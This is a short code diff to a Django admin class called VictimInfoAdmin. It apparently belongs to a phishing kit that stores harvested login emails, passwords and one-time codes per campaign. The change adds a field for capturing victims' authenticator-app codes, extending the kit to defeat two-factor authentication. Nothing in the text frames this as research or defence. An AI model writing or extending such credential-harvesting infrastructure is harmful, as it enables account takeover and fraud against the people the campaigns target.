@@ -46,7 +46,7 @@ class VictimInfoAdmin(admin.ModelAdmin):
     
     fieldsets = (
         ('Recipient Information', {
-            'fields': ('user', 'campaign', 'login_email','login_password', 'login_otp')
+            'fields': ('user', 'campaign', 'login_email','login_password', 'login_otp', 'login_authenticator_app_code')
         }),
         ('Metadata', {
             'fields': ('created_at', 'updated_at'),
